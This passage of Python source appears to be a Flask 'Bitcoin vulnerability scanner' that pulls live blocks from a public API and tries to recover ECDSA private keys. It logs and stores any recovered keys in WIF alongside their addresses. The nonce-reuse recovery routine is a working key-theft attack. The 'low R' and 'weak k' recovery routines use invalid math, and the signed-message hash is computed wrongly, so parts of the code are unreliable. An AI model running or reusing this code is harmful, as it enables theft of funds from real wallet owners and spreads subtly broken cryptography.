#!/usr/bin/env python3
"""
Consolidated Bitcoin Vulnerability Scanner
Comprehensive ECDSA analysis with interactive dashboard and autopilot mode
"""

import os
import logging
import sys
import hashlib
import re
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple
import requests
import json
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, render_template, request, jsonify, flash, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from werkzeug.middleware.proxy_fix import ProxyFix
from sqlalchemy import create_engine, Column, Integer, String, DateTime, Text, Float, Boolean
from sqlalchemy.orm import sessionmaker, DeclarativeBase
from sqlalchemy.exc import SQLAlchemyError
import base58
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Import configuration
from config import Config

# Configure logging
logging.basicConfig(level=logging.DEBUG)

class Base(DeclarativeBase):
    pass
db = SQLAlchemy()

# Create Flask app
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "bitcoin-vulnerability-scanner-secret-key")
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)

# Configure database
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///bitcoin_vulnerabilities.db"
app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
    "pool_recycle": 300,
    "pool_pre_ping": True,
}
db.init_app(app)

# Database Models
class AnalysisResult(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    analysis_key = db.Column(db.String(256), unique=True, nullable=False)
    block_input = db.Column(db.String(256), nullable=False)
    status = db.Column(db.String(50), nullable=False)
    started_at = db.Column(db.DateTime, nullable=False)
    completed_at = db.Column(db.DateTime)
    result_data = db.Column(db.Text)
    vulnerability_count = db.Column(db.Integer, default=0)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class Vulnerability(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    analysis_key = db.Column(db.String(256), nullable=False)
    vulnerability_type = db.Column(db.String(100), nullable=False)
    txid = db.Column(db.String(64))
    risk_level = db.Column(db.String(20))
    details = db.Column(db.Text)
    private_key = db.Column(db.String(64))
    addresses = db.Column(db.Text)  # JSON string of addresses
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

# Global autopilot state
autopilot_state = {
    'running': False,
    'current_block': 0,
    'start_block': 0,
    'end_block': 0,
    'direction': 'forward',
    'total_blocks': 0,
    'blocks_analyzed': 0,
    'vulnerabilities_found': 0,
    'private_keys_recovered': 0,
    'last_update': datetime.now(),
    'results': []
}

class BitcoinBlockAnalyzer:
    """Comprehensive Bitcoin block vulnerability analyzer"""

    def __init__(self):
        self.N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
        self.BLOCKSTREAM_API = Config.BLOCKSTREAM_API
        self.REQUEST_TIMEOUT = Config.REQUEST_TIMEOUT
        self.transaction_cache = {}
        self.signature_cache = {}
        self.balance_cache = {}
        self.signature_database = {}
        self.r_value_tracker = {}  # Track R values for k-reuse detection

        # Known vulnerable patterns and keys
        self.vulnerable_patterns = [
            r'^0+[1-9a-f]',      # Leading zeros
            r'^f+[0-9a-e]',      # Leading f's  
            r'^1+[02-9a-f]',     # Leading 1's
            r'(.)\1{8,}',        # Repeating characters
            r'^[0-9]+$',         # Only digits
            r'^[a-f]+$',         # Only hex letters
        ]

        # Dynamic weak key detection - no hardcoded lists
        self.known_weak_keys = set()

    def _is_weak_key(self, private_key_hex: str) -> bool:
        """Dynamically detect weak private keys based on patterns"""
        if not private_key_hex or len(private_key_hex) != 64:
            return True
        
        # Check for common weak patterns
        weak_patterns = [
            r'^0+[1-9a-f]',      # Leading zeros
            r'^f+[0-9a-e]',      # Leading f's  
            r'^1+[02-9a-f]',     # Leading 1's
            r'(.)\1{8,}',        # Repeating characters
            r'^[0-9]+$',         # Only digits
            r'^[a-f]+$',         # Only hex letters
            r'^deadbeef',        # Common test pattern
            r'^cafebabe',        # Common test pattern
            r'^12345678',        # Sequential pattern
            r'^87654321',        # Reverse sequential pattern
        ]
        
        import re
        for pattern in weak_patterns:
            if re.match(pattern, private_key_hex.lower()):
                return True
        
        # Check for low entropy (too many repeated bytes)
        byte_counts = {}
        for i in range(0, len(private_key_hex), 2):
            byte = private_key_hex[i:i+2]
            byte_counts[byte] = byte_counts.get(byte, 0) + 1
        
        # If more than 50% of bytes are the same, consider it weak
        if max(byte_counts.values()) > 16:
            return True
        
        return False

    def _generate_weak_k_values(self) -> list:
        """Generate weak k values based on common cryptographic weaknesses"""
        weak_k_values = []
        
        # Small integers (common in broken RNG implementations)
        weak_k_values.extend([1, 2, 3, 4, 5, 6, 7, 8, 9, 10])
        
        # Powers of 2 (common in bitwise operations)
        for i in range(1, 32):
            weak_k_values.append(2 ** i)
        
        # Common test patterns in hex
        test_patterns = [
            0xdeadbeef, 0xcafebabe, 0x12345678, 0x87654321,
            0x00000001, 0xffffffff, 0xaaaaaaaa, 0x55555555
        ]
        weak_k_values.extend(test_patterns)
        
        # Sequential patterns
        for i in range(0x100, 0x1000, 0x100):
            weak_k_values.append(i)
        
        # Values close to curve order boundaries
        boundary_values = [
            self.N - 1, self.N - 2, self.N - 3,
            1, 2, 3
        ]
        weak_k_values.extend(boundary_values)
        
        # Remove duplicates and values outside valid range
        weak_k_values = list(set(weak_k_values))
        weak_k_values = [k for k in weak_k_values if 0 < k < self.N]
        
        return weak_k_values

    def analyze_block(self, block_input: str) -> Dict[str, Any]:
        """Analyze a Bitcoin block for vulnerabilities"""
        try:
            block_data = self._fetch_block_data(block_input)
            if not block_data:
                return {'error': 'Failed to fetch block data', 'vulnerabilities': {}}

            block_hash = block_data['id']
            block_height = block_data.get('height', 'unknown')
            transactions = block_data.get('tx', [])

            analysis_result = {
                'block_hash': block_hash,
                'block_height': block_height,
                'transaction_count': len(transactions),
                'vulnerabilities': {
                    'k_reuse': [],
                    'low_r_values': [],
                    'lattice_attack': [],
                    'sequential_k': [],
                    'lsb_bias': [],
                    'msb_bias': [],
                    'weak_randomness': [],
                    'signature_malleability': [],
                    'recovered_private_keys': []
                },
                'summary': {
                    'total_vulnerabilities': 0,
                    'critical_count': 0,
                    'high_count': 0,
                    'medium_count': 0,
                    'private_keys_found': 0
                },
                'analysis_time': 0
            }

            start_time = time.time()

            # Collect all signatures across all transactions for k-reuse analysis
            all_signatures = []

            # Analyze each transaction individually first
            for tx in transactions[:50]:  # Limit to first 50 transactions for performance
                tx_analysis = self._analyze_transaction(tx)
                self._merge_vulnerabilities(analysis_result, tx_analysis)

                # Extract signatures for block-level analysis
                tx_signatures = self._extract_all_signatures_from_tx(tx)
                all_signatures.extend(tx_signatures)

            # Perform block-level k-reuse analysis
            k_reuse_analysis = self._analyze_k_reuse_across_block(all_signatures)
            self._merge_vulnerabilities(analysis_result, k_reuse_analysis)

            analysis_result['analysis_time'] = time.time() - start_time
            self._calculate_summary(analysis_result)

            return analysis_result

        except Exception as e:
            logging.error(f"Error analyzing block {block_input}: {e}")
            return {'error': str(e), 'vulnerabilities': {}}

    def _fetch_block_data(self, block_input: str) -> Optional[Dict]:
        """Fetch block data from Blockstream API with enhanced error handling"""
        try:
            # Determine if input is hash or height
            if block_input.isdigit():
                url = f"{self.BLOCKSTREAM_API}/block-height/{block_input}"
                response = requests.get(url, timeout=self.REQUEST_TIMEOUT)
                if response.status_code == 200:
                    block_hash = response.text.strip()
                elif response.status_code == 404:
                    logging.error(f"Block {block_input} not found")
                    return None
                else:
                    logging.error(f"API error {response.status_code} for block {block_input}")
                    return None
            else:
                block_hash = block_input

            # Fetch block data with transactions
            url = f"{self.BLOCKSTREAM_API}/block/{block_hash}"
            response = requests.get(url, timeout=self.REQUEST_TIMEOUT)

            if response.status_code == 200:
                block_data = response.json()

                # Fetch transactions separately for better performance
                tx_url = f"{self.BLOCKSTREAM_API}/block/{block_hash}/txs"
                tx_response = requests.get(tx_url, timeout=self.REQUEST_TIMEOUT)

                if tx_response.status_code == 200:
                    block_data['tx'] = tx_response.json()
                else:
                    block_data['tx'] = []

                return block_data
            elif response.status_code == 404:
                logging.error(f"Block hash {block_hash} not found")
                return None
            else:
                logging.error(f"API error {response.status_code} for block hash {block_hash}")
                return None

        except requests.RequestException as e:
            logging.error(f"Network error fetching block data: {e}")
            return None
        except Exception as e:
            logging.error(f"Unexpected error fetching block data: {e}")
            return None

    def _analyze_transaction(self, tx: Dict) -> Dict[str, Any]:
        """Analyze a single transaction for vulnerabilities"""
        vulnerabilities = {
            'k_reuse': [],
            'low_r_values': [],
            'lattice_attack': [],
            'sequential_k': [],
            'lsb_bias': [],
            'msb_bias': [],
            'weak_randomness': [],
            'signature_malleability': [],
            'recovered_private_keys': []
        }

        try:
            txid = tx['txid']

            # Analyze each input
            for i, input_tx in enumerate(tx.get('vin', [])):
                if 'scriptsig' in input_tx and input_tx['scriptsig']:
                    sig_analysis = self._analyze_signature(input_tx['scriptsig'], txid, i)
                    self._merge_tx_vulnerabilities(vulnerabilities, sig_analysis)

            return vulnerabilities

        except Exception as e:
            logging.error(f"Error analyzing transaction: {e}")
            return vulnerabilities

    def _analyze_signature(self, scriptsig: str, txid: str, input_index: int) -> Dict[str, Any]:
        """Analyze signature for cryptographic vulnerabilities"""
        vulnerabilities = {
            'k_reuse': [],
            'low_r_values': [],
            'lattice_attack': [],
            'sequential_k': [],
            'lsb_bias': [],
            'msb_bias': [],
            'weak_randomness': [],
            'signature_malleability': [],
            'recovered_private_keys': []
        }

        try:
            # Extract signature from scriptsig
            sig_data = self._extract_signature_from_scriptsig(scriptsig)
            if not sig_data:
                return vulnerabilities

            r, s = sig_data['r'], sig_data['s']
            z = sig_data['z']
            # Check for low R values
            if r < 2**64:
                vulnerabilities['low_r_values'].append({
                    'txid': txid,
                    'input_index': input_index,
                    'r_value': hex(r),
                    'risk_level': 'CRITICAL',
                    'description': f'Extremely low R value: {hex(r)}'
                })

            # Check for LSB bias (even R values)
            if r % 2 == 0:
                vulnerabilities['lsb_bias'].append({
                    'txid': txid,
                    'input_index': input_index,
                    'r_value': hex(r),
                    'risk_level': 'MEDIUM',
                    'description': 'Even R value detected (LSB bias)'
                })

            # Check for MSB bias (leading zeros)
            r_hex = f"{r:064x}"
            if r_hex.startswith('00'):
                vulnerabilities['msb_bias'].append({
                    'txid': txid,
                    'input_index': input_index,
                    'r_value': r_hex,
                    'risk_level': 'HIGH',
                    'description': f'R value with leading zeros: {r_hex[:16]}...'
                })

            # Check for signature malleability
            if s > self.N // 2:
                vulnerabilities['signature_malleability'].append({
                    'txid': txid,
                    'input_index': input_index,
                    's_value': hex(s),
                    'risk_level': 'MEDIUM',
                    'description': 'High S value (signature malleability)'
                })

            # Check for sequential patterns
            if self._has_sequential_pattern(r):
                vulnerabilities['sequential_k'].append({
                    'txid': txid,
                    'input_index': input_index,
                    'r_value': hex(r),
                    'risk_level': 'HIGH',
                    'description': 'Sequential pattern in R value'
                })

            # Check for weak randomness patterns
            if self._has_weak_randomness(r, s):
                vulnerabilities['weak_randomness'].append({
                    'txid': txid,
                    'input_index': input_index,
                    'r_value': hex(r),
                    's_value': hex(s),
                    'risk_level': 'HIGH',
                    'description': 'Weak randomness detected in signature'
                })

            # Determine initial risk level and vulnerability type
            risk_level = 'LOW'
            vuln_type = 'signature_analysis'
            
            if r < 2**64:
                risk_level = 'CRITICAL'
                vuln_type = 'low_r_value'
            elif r < 2**128:
                risk_level = 'HIGH'
                vuln_type = 'weak_r_value'
            elif s > self.N // 2:
                risk_level = 'MEDIUM'
                vuln_type = 'signature_malleability'

            # Attempt private key recovery for critical vulnerabilities
            recovered_key = None
            if risk_level == 'CRITICAL':
                recovered_key = self._attempt_private_key_recovery(r, s, z, txid)

            if recovered_key:
                addresses = self._generate_addresses_from_wif(recovered_key)
                vulnerabilities['recovered_private_keys'].append({
                    'txid': txid,
                    'input_index': input_index,
                    'private_key_wif': recovered_key,
                    'addresses': addresses,
                    'risk_level': 'CRITICAL',
                    'recovery_method': 'Low R brute force',
                    'description': f'Private key recovered (WIF): {recovered_key[:16]}...'
                })

            # Store signature for analysis with enhanced data
            sig_data = {
                'txid': txid,
                'r_value': hex(r),
                's_value': hex(s),
                'z_value': hex(z),
                'r_int': r,
                's_int': s,
                'z_int': z,
                'vulnerability_type': vuln_type,
                'risk_level': risk_level,
                'timestamp': datetime.now().isoformat()
            }

            # Store in signature database
            sig_key = f"{txid}_{input_index}"
            self.signature_database[sig_key] = sig_data

            # Track R values for k-reuse detection
            r_hex = hex(r)
            if r_hex not in self.r_value_tracker:
                self.r_value_tracker[r_hex] = []

            self.r_value_tracker[r_hex].append({
                'txid': txid,
                'sig_key': sig_key,
                's_value': s,
                'z_value': z,
                'timestamp': datetime.now().isoformat()
            })

            # Check for immediate k-reuse
            if len(self.r_value_tracker[r_hex]) > 1:
                logging.warning(f"K-REUSE DETECTED! R value {r_hex} used in multiple transactions")

                # Attempt recovery with all combinations
                for i, sig1 in enumerate(self.r_value_tracker[r_hex]):
                    for j, sig2 in enumerate(self.r_value_tracker[r_hex]):
                        if i != j and sig1['s_value'] != sig2['s_value']:
                            recovered_key = self._recover_private_key_from_k_reuse(
                                r, sig1['s_value'], sig2['s_value'],
                                sig1['z_value'], sig2['z_value']
                            )
                            if recovered_key:
                                sig_data['private_key_recovered'] = recovered_key
                                sig_data['recovery_method'] = 'k-reuse_detection'
                                logging.critical(f"PRIVATE KEY RECOVERED: {recovered_key}")
                                break
                    if recovered_key:
                        break

            return vulnerabilities

        except Exception as e:
            logging.error(f"Error analyzing signature: {e}")
            return vulnerabilities

    def _extract_signature_from_scriptsig(self, scriptsig: str) -> Optional[Dict]:
        """Extract R and S values from scriptsig"""
        try:
            if not scriptsig:
                return None

            # Parse DER signature from scriptsig
            script_bytes = bytes.fromhex(scriptsig)

            # Find signature in script
            for i in range(len(script_bytes) - 8):
                if script_bytes[i] == 0x30:  # DER sequence tag
                    try:
                        sig_len = script_bytes[i + 1]
                        if i + 2 + sig_len <= len(script_bytes):
                            der_sig = script_bytes[i:i + 2 + sig_len]
                            r, s = self._parse_der_signature(der_sig)
                            if r and s:
                                # Calculate message hash (simplified)
                                z = int(hashlib.sha256(der_sig).hexdigest(), 16) % self.N

                                return {'r': r, 's': s, 'z': z}
                    except:
                        continue

            return None

        except Exception as e:
            logging.error(f"Error extracting signature: {e}")
            return None

    def _parse_der_signature(self, der_bytes: bytes) -> Tuple[Optional[int], Optional[int]]:
        """Parse DER-encoded signature to extract R and S"""
        try:
            if len(der_bytes) < 8:
                return None, None

            pos = 2  # Skip sequence tag and length

            # Parse R
            if der_bytes[pos] != 0x02:
                return None, None
            pos += 1

            r_len = der_bytes[pos]
            pos += 1
            r_bytes = der_bytes[pos:pos + r_len]
            r = int.from_bytes(r_bytes, 'big')
            pos += r_len

            # Parse S
            if pos >= len(der_bytes) or der_bytes[pos] != 0x02:
                return None, None
            pos += 1

            s_len = der_bytes[pos]
            pos += 1
            s_bytes = der_bytes[pos:pos + s_len]
            s = int.from_bytes(s_bytes, 'big')

            return r, s

        except Exception as e:
            logging.error(f"Error parsing DER signature: {e}")
            return None, None

    def _has_sequential_pattern(self, value: int) -> bool:
        """Check for sequential patterns in value"""
        try:
            hex_str = f"{value:064x}"
            for i in range(len(hex_str) - 4):
                substr = hex_str[i:i+5]
                values = [int(c, 16) for c in substr]
                # Check ascending
                if all(values[j] + 1 == values[j+1] for j in range(len(values)-1)):
                    return True
                # Check descending  
                if all(values[j] - 1 == values[j+1] for j in range(len(values)-1)):
                    return True
            return False
        except:
            return False

    def _has_weak_randomness(self, r: int, s: int) -> bool:
        """Check for weak randomness indicators"""
        try:
            # Check for common patterns
            r_hex = f"{r:064x}"
            s_hex = f"{s:064x}"

            # Too many repeated characters
            if len(set(r_hex)) < 8 or len(set(s_hex)) < 8:
                return True

            # Check for common weak patterns
            for pattern in self.vulnerable_patterns:
                if re.match(pattern, r_hex) or re.match(pattern, s_hex):
                    return True

            return False
        except:
            return False

    def _private_key_to_wif(self, private_key_int: int, compressed: bool = True) -> str:
        """Convert private key integer to WIF format"""
        try:
            import hashlib

            # Convert to 32-byte format
            private_key_bytes = private_key_int.to_bytes(32, 'big')

            # Add version byte (0x80 for mainnet)
            payload = b'\x80' + private_key_bytes

            # Add compression flag if compressed
            if compressed:
                payload += b'\x01'

            # Calculate checksum (first 4 bytes of double SHA256)
            checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]

            # Combine payload and checksum
            full_payload = payload + checksum

            # Convert to base58
            return self._base58_encode(full_payload)
        except Exception as e:
            logging.error(f"Error converting to WIF: {e}")
            return f"{private_key_int:064x}"  # Fallback to hex

    def _base58_encode(self, data: bytes) -> str:
        """Encode bytes to base58"""
        alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

        # Convert to integer
        num = int.from_bytes(data, 'big')

        # Handle leading zeros
        leading_zeros = len(data) - len(data.lstrip(b'\x00'))

        # Convert to base58
        result = ""
        while num > 0:
            num, remainder = divmod(num, 58)
            result = alphabet[remainder] + result

        # Add leading 1s for leading zeros
        result = '1' * leading_zeros + result

        return result


    def _recover_from_manual_data(self, r: int, s1: int, s2: int, s3: int, z1: int, z2: int, z3: int) -> Optional[str]:
        """Recover private key from manually provided signature data (like your example)"""
        try:
            logging.info(f"Attempting recovery from manual K-reuse data:")
            logging.info(f"R: {r}")
            logging.info(f"S1: {s1}, S2: {s2}, S3: {s3}")
            logging.info(f"Z1: {z1}, Z2: {z2}, Z3: {z3}")

            # Try different signature pairs
            pairs = [(s1, s2, z1, z2), (s1, s3, z1, z3), (s2, s3, z2, z3)]
            
            for i, (sa, sb, za, zb) in enumerate(pairs):
                try:
                    # Calculate k using k-reuse formula
                    s_diff = (sa - sb) % self.N
                    z_diff = (za - zb) % self.N
                    
                    if s_diff == 0:
                        continue
                    
                    # Calculate k = (z1 - z2) / (s1 - s2) mod N
                    s_diff_inv = pow(s_diff, self.N - 2, self.N)
                    k = (z_diff * s_diff_inv) % self.N
                    
                    if k == 0:
                        continue
                    
                    # Calculate private key d = (s*k - z) / r mod N
                    r_inv = pow(r, self.N - 2, self.N)
                    private_key = ((sa * k - za) * r_inv) % self.N
                    
                    if 0 < private_key < self.N:
                        wif = self._private_key_to_wif(private_key, compressed=True)
                        logging.critical(f"SUCCESS! Private key recovered using pair {i+1}: {wif}")
                        return wif
                        
                except Exception as pair_error:
                    logging.error(f"Error with pair {i+1}: {pair_error}")
                    continue
            
            return None
            
        except Exception as e:
            logging.error(f"Error in manual k-reuse recovery: {e}")
            return None

    def _attempt_private_key_recovery(self, r: int, s: int, z: int, txid: str) -> Optional[str]:
        """Attempt to recover private key from vulnerable signature with enhanced methods"""
        try:
            # Method 1: Direct low R brute force
            if r < 2**32:
                for k in range(1, min(r + 100, 2**24)):  # Limit search space
                    try:
                        # Check if k generates this r value
                        if pow(k, 1, self.N) == r % self.N:
                            # Calculate potential private key
                            private_key = (k * s) % self.N
                            if 0 < private_key < self.N:
                                wif = self._private_key_to_wif(private_key, compressed=True)
                                logging.info(f"Recovered private key from low R: {wif}")
                                return wif
                    except:
                        continue

            # Method 2: Known weak k values
            # Generate weak k values dynamically based on common patterns
            weak_k_values = self._generate_weak_k_values()
            for k in weak_k_values:
                try:
                    if pow(k, 1, self.N) == r % self.N:
                        private_key = (k * s) % self.N
                        if 0 < private_key < self.N:
                            wif = self._private_key_to_wif(private_key, compressed=True)
                            logging.info(f"Recovered private key from weak k: {wif}")
                            return wif
                except:
                    continue

            # Method 3: Pattern-based recovery for sequential k
            if self._has_sequential_pattern(r):
                for offset in range(-10, 11):
                    k_candidate = r + offset
                    if 0 < k_candidate < self.N:
                        try:
                            private_key = (k_candidate * s) % self.N
                            if 0 < private_key < self.N:
                                wif = self._private_key_to_wif(private_key, compressed=True)
                                logging.info(f"Recovered private key from sequential pattern: {wif}")
                                return wif
                        except:
                            continue

            return None
        except Exception as e:
            logging.error(f"Error in private key recovery: {e}")
            return None

    def _recover_private_key_from_k_reuse(self, r: int, s1: int, s2: int, z1: int, z2: int) -> Optional[str]:
        """Recover private key using two-step ECDSA k-reuse attack algorithm"""
        try:
            # Validate inputs
            if s1 == s2:
                logging.error("Invalid signatures: s1 equals s2")
                return None
            
            if r == 0:
                logging.error("Invalid signature: r equals zero")
                return None
            
            # Step 1: Recover nonce k = (z1-z2)/(s1-s2) mod n
            numerator = (z1 - z2) % self.N
            denominator = (s1 - s2) % self.N
            
            if denominator == 0:
                logging.error("Invalid signatures: s1-s2 equals zero")
                return None
            
            denominator_inv = pow(denominator, self.N - 2, self.N)  # modular inverse
            k = (numerator * denominator_inv) % self.N
            
            logging.info(f"Step 1 - Recovered nonce k: {hex(k)}")
            
            # Step 2: Recover private key d = (s1*k-z1)/r mod n
            numerator2 = (s1 * k - z1) % self.N
            r_inv = pow(r, self.N - 2, self.N)  # modular inverse
            private_key = (numerator2 * r_inv) % self.N
            
            logging.info(f"Step 2 - Recovered private key: {hex(private_key)}")
            
            # Verify the private key is not zero
            if private_key == 0:
                logging.error("Recovered private key is zero")
                return None
            
            # Convert to WIF format
            wif = self._private_key_to_wif(private_key, compressed=True)
            logging.critical(f"SUCCESS! Private key recovered from k-reuse: {wif}")
            return wif
            
        except Exception as e:
            logging.error(f"Error in k-reuse recovery: {e}")
            return None

    def _validate_recovered_private_key(self, private_key_wif: str, r: int, s: int, z: int) -> Dict[str, Any]:
        """Validate a recovered private key against original signature components"""
        try:
            # Convert WIF back to private key integer
            private_key_bytes = self._wif_to_private_key_bytes(private_key_wif)
            private_key_int = int.from_bytes(private_key_bytes, 'big')
            
            # Basic validation
            if not (0 < private_key_int < self.N):
                return {
                    'valid': False,
                    'error': 'Private key out of valid range',
                    'details': f'Key: {hex(private_key_int)}, Range: (0, {hex(self.N)})'
                }
            
            # TODO: Implement full signature verification
            # For now, return basic validation result
            return {
                'valid': True,
                'private_key_hex': hex(private_key_int),
                'validation_method': 'basic_range_check',
                'details': 'Private key is within valid range for secp256k1'
            }
            
        except Exception as e:
            return {
                'valid': False,
                'error': f'Validation failed: {str(e)}',
                'details': 'Could not validate private key'
            }

    def _extract_all_signatures_from_tx(self, tx: Dict) -> List[Dict]:
        """Extract all signatures from a transaction using raw transaction parsing"""
        signatures = []
        try:
            txid = tx['txid']

            # Fetch raw transaction data
            raw_tx = self._fetch_raw_transaction(txid)
            if not raw_tx:
                # Fallback to scriptsig parsing
                return self._extract_signatures_from_scriptsig_fallback(tx)

            # Parse raw transaction to extract signatures
            parsed_sigs = self._parse_raw_transaction_signatures(raw_tx, txid)
            signatures.extend(parsed_sigs)

        except Exception as e:
            logging.error(f"Error extracting signatures from tx {txid}: {e}")
            # Fallback to original method
            return self._extract_signatures_from_scriptsig_fallback(tx)
        return signatures

    def _fetch_raw_transaction(self, txid: str) -> Optional[str]:
        """Fetch raw transaction hex data"""
        try:
            url = f"{self.BLOCKSTREAM_API}/tx/{txid}/hex"
            response = requests.get(url, timeout=self.REQUEST_TIMEOUT)
            if response.status_code == 200:
                return response.text.strip()
        except Exception as e:
            logging.error(f"Error fetching raw transaction {txid}: {e}")
        return None

    def _parse_raw_transaction_signatures(self, raw_tx_hex: str, txid: str) -> List[Dict]:
        """Parse raw transaction hex to extract signature components"""
        signatures = []
        try:
            tx_bytes = bytes.fromhex(raw_tx_hex)

            # Parse transaction structure
            pos = 0

            # Skip version (4 bytes)
            pos += 4

            # Read input count
            input_count, pos = self._read_varint(tx_bytes, pos)

            # Parse each input
            for input_index in range(input_count):
                input_data, pos = self._parse_transaction_input(tx_bytes, pos)

                if input_data and 'scriptsig' in input_data:
                    # Extract signature from scriptsig
                    sig_components = self._extract_signature_components(input_data['scriptsig'])

                    if sig_components:
                        # Calculate proper message hash for this input
                        message_hash = self._calculate_sighash(raw_tx_hex, input_index)

                        sig_components.update({
                            'txid': txid,
                            'input_index': input_index,
                            'z': message_hash,
                            'raw_scriptsig': input_data['scriptsig'].hex()
                        })
                        signatures.append(sig_components)

        except Exception as e:
            logging.error(f"Error parsing raw transaction {txid}: {e}")

        return signatures

    def _read_varint(self, data: bytes, pos: int) -> Tuple[int, int]:
        """Read variable-length integer from transaction data"""
        if pos >= len(data):
            return 0, pos

        first_byte = data[pos]
        pos += 1

        if first_byte < 0xfd:
            return first_byte, pos
        elif first_byte == 0xfd:
            return int.from_bytes(data[pos:pos+2], 'little'), pos + 2
        elif first_byte == 0xfe:
            return int.from_bytes(data[pos:pos+4], 'little'), pos + 4
        elif first_byte == 0xff:
            return int.from_bytes(data[pos:pos+8], 'little'), pos + 8

    def _encode_varint(self, value: int) -> bytes:
        """Encode an integer using Bitcoin's variable-length format"""
        if value < 0xfd:
            return value.to_bytes(1, 'little')
        if value <= 0xffff:
            return b"\xfd" + value.to_bytes(2, 'little')
        if value <= 0xffffffff:
            return b"\xfe" + value.to_bytes(4, 'little')
        return b"\xff" + value.to_bytes(8, 'little')

    def _double_sha256(self, data: bytes) -> bytes:
        """Return a Bitcoin-style double SHA-256 hash"""
        return hashlib.sha256(hashlib.sha256(data).digest()).digest()

    def _decode_raw_transaction(self, raw_tx_hex: str) -> Dict[str, Any]:
        """Decode a raw transaction into its constituent fields"""
        tx_bytes = bytes.fromhex(raw_tx_hex)
        pos = 0

        version = int.from_bytes(tx_bytes[pos:pos+4], 'little')
        pos += 4

        is_segwit = False
        if pos < len(tx_bytes) - 1 and tx_bytes[pos] == 0 and tx_bytes[pos + 1] != 0:
            is_segwit = True
            pos += 2  # Skip marker and flag

        input_count, pos = self._read_varint(tx_bytes, pos)

        inputs = []
        for _ in range(input_count):
            prev_hash = tx_bytes[pos:pos+32]
            pos += 32
            prev_index = int.from_bytes(tx_bytes[pos:pos+4], 'little')
            pos += 4

            script_length, pos = self._read_varint(tx_bytes, pos)
            script_sig = tx_bytes[pos:pos+script_length]
            pos += script_length

            sequence = int.from_bytes(tx_bytes[pos:pos+4], 'little')
            pos += 4

            inputs.append({
                'prev_hash': prev_hash,
                'prev_index': prev_index,
                'script_sig': script_sig,
                'sequence': sequence,
                'witness': []
            })

        output_count, pos = self._read_varint(tx_bytes, pos)

        outputs = []
        for _ in range(output_count):
            value = int.from_bytes(tx_bytes[pos:pos+8], 'little')
            pos += 8

            script_length, pos = self._read_varint(tx_bytes, pos)
            script_pubkey = tx_bytes[pos:pos+script_length]
            pos += script_length

            outputs.append({
                'value': value,
                'script_pubkey': script_pubkey
            })

        if is_segwit:
            for input_data in inputs:
                item_count, pos = self._read_varint(tx_bytes, pos)
                witness_items = []
                for _ in range(item_count):
                    item_length, pos = self._read_varint(tx_bytes, pos)
                    item = tx_bytes[pos:pos+item_length]
                    pos += item_length
                    witness_items.append(item)
                input_data['witness'] = witness_items

        lock_time = int.from_bytes(tx_bytes[pos:pos+4], 'little') if pos + 4 <= len(tx_bytes) else 0

        return {
            'version': version,
            'inputs': inputs,
            'outputs': outputs,
            'lock_time': lock_time,
            'is_segwit': is_segwit
        }

    def _parse_script_pushes(self, script: bytes) -> List[bytes]:
        """Extract pushed data elements from a script"""
        pushes: List[bytes] = []
        pos = 0
        while pos < len(script):
            opcode = script[pos]
            pos += 1

            if opcode == 0:
                pushes.append(b"")
                continue

            if opcode <= 75:
                length = opcode
            elif opcode == 0x4c and pos < len(script):
                length = script[pos]
                pos += 1
            elif opcode == 0x4d and pos + 1 < len(script):
                length = int.from_bytes(script[pos:pos+2], 'little')
                pos += 2
            elif opcode == 0x4e and pos + 3 < len(script):
                length = int.from_bytes(script[pos:pos+4], 'little')
                pos += 4
            else:
                # Not a push opcode; skip
                continue

            data = script[pos:pos+length]
            pos += length
            pushes.append(data)

        return pushes

    def _get_prevout_data(self, prev_txid: str, vout: int) -> Optional[Dict[str, Any]]:
        """Return cached information about a previous output, fetching it if needed"""
        cached = self.transaction_cache.get(prev_txid)
        if cached and 'outputs' in cached and vout < len(cached['outputs']):
            return cached['outputs'][vout]

        raw_prev_tx = self._fetch_raw_transaction(prev_txid)
        if not raw_prev_tx:
            return None

        decoded = self._decode_raw_transaction(raw_prev_tx)
        outputs = decoded.get('outputs', [])
        self.transaction_cache[prev_txid] = {'outputs': outputs}

        if vout < len(outputs):
            return outputs[vout]
        return None

    def _determine_sighash_type(self, input_data: Dict[str, Any]) -> int:
        """Infer the sighash type from scriptSig or witness data"""
        for push in self._parse_script_pushes(input_data.get('script_sig', b'')):
            if push and push[0] == 0x30:
                return push[-1]

        for item in input_data.get('witness', []):
            if item and item[0] == 0x30:
                return item[-1]

        return 0x01  # Default to SIGHASH_ALL

    def _derive_script_code(self, input_data: Dict[str, Any], prev_script: bytes) -> bytes:
        """Determine the scriptCode to use for signature hashing"""
        script_sig = input_data.get('script_sig', b'')
        witness = input_data.get('witness', [])

        # Native P2WPKH
        if prev_script.startswith(b"\x00\x14") and len(prev_script) == 22:
            return b"\x76\xa9\x14" + prev_script[2:] + b"\x88\xac"

        # Native P2WSH
        if prev_script.startswith(b"\x00\x20") and len(prev_script) == 34 and witness:
            return witness[-1]

        # P2SH redeem script scenarios
        if prev_script.startswith(b"\xa9") and prev_script.endswith(b"\x87") and len(prev_script) == 23:
            pushes = self._parse_script_pushes(script_sig)
            if pushes:
                redeem_script = pushes[-1]
                if redeem_script.startswith(b"\x00\x14") and len(redeem_script) == 22:
                    return b"\x76\xa9\x14" + redeem_script[2:] + b"\x88\xac"
                if redeem_script.startswith(b"\x00\x20") and witness:
                    return witness[-1]
                return redeem_script

        return prev_script

    def _parse_transaction_input(self, tx_bytes: bytes, pos: int) -> Tuple[Optional[Dict], int]:
        """Parse a single transaction input"""
        try:
            # Previous transaction hash (32 bytes)
            prev_hash = tx_bytes[pos:pos+32]
            pos += 32

            # Previous output index (4 bytes)
